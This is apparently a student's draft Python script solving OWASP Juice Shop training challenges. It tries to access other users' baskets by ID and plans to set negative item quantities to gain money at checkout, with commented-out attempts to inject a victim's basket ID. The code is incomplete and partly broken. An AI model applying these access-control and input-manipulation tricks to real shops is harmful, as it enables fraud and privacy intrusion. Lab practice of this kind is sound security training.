"""
This file is used to solve the OWASP Juice-shop Task
VIEW BASKET
MANIPULATE BASKET
GOAL: to view or manipulate on other people's basket
METHODOLOGY:
step1. login using user A's cookies and headers
    Hint: we can use the user created in repetitive registration
step2. ....
---------------------------------------------------------------
This file is used to solve the OWASP Juice-shop Task
PAYBACK TIME
Category: Improper Input Validation
GOAL: set the amount of sth in your basket to be negative
      after this you can checkout and gain money
METHODOLOGY:
step1. login using user A's cookies and headers
    Hint: we can use the user created in repetitive registration
step2. Set the quantity of sth in your basket to be -1000000
setp3. Set address and checkout
"""
import json

from plugins import attack as a
from plugins import login as usrLogin
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import random

from urllib import parse

class manipulate_basket(a.attack_inter):
    def __init__(self):
        self.juice_session = a.requests.session()
        #usr = usrLogin.test_user_login_class()
        #res, self.cookie, self.header = usr.first_login()
        self.email = 'test66@gmail.com'
        self.cookie, self.header = a.auth_load(self.email)
        self.basketId = a.bid_load(self.email)
        self.victimEmail = 'test334@gmail.com'
        self.victimBid = a.bid_load(self.victimEmail)

    def view_basket(self, basektId):
        print('-----------------------------------------------------')
        print("Let us view user {} with  basket id {} --------------".format(self.email, basektId))
        try:
            productIds = []
            url = a.URL + '/rest/basket/' + str(basektId)
            response = self.juice_session.get(url, cookies=self.cookie, headers=self.header)
            # print(response.text)
            products = response.json()["data"]["Products"]
            for i in range( len(products) ):
                item = products[i]
                productIds.append( item['id'] )
            print(productIds)
            return productIds
        except:
            print("1")

    def check_productId(self, basekId, productId):
        return productId in self.view_basket(basekId)

    def generate_productID(self, basketId):
        pId = random.randint(1,20)
        count = 0
        while self.check_productId(basketId, pId):
            if count > 10:
                return None
            pId = random.randint
            count += 1
        return pId

    def addto_basket(self,quantity):
        print('---------------------------------------------------')
        #print("Let us add to basket ID {} ----------------".format(self.victimBid))
        try:
            productId = self.generate_productID(self.basketId)
            print("we will add product Id {} ".format(productId))
            # data = [('contract','lalala'),('contract','lololo')]
            # data_byte = parse.urlencode(data).encode("utf-8")
            # print(data_byte)
            json = {
                "ProductId": 1,
                #"BasketId": '|'.join([self.basketId, self.victimBid]),
                "BasketId": self.basketId,
                # "BasketId": self.victimBid,
                "quantity": 1
            }
            # data = {
            #     "BasketId": self.victimBid
            # }

            url =a.URL + '/api/BasketItems/'
            response = self.juice_session.post(url, cookies=self.cookie, headers=self.header,json = json, verify= False)

            print(response.status_code)
            #self.view_basket(self.victimBid)
        except:
            print("2")



    def manipulate_basket(self):
        pass

    def generator(self):
        pass

    def run(self):
        a.logging.basicConfig(filename='./test_logging_info.log', encoding='utf-8',
                            level=a.logging.INFO, format='%(asctime)s %(message)s')
        logger = a.logging.getLogger("Manipulate Basket")
        a.logging.info(logger)
        a.logging.info('Started')
        #print("bein")
        #self.view_basket(self.basketId)
        print("hello")
        self.addto_basket(1)
        #self.view_basket("2")
        a.logging.info('Finished')



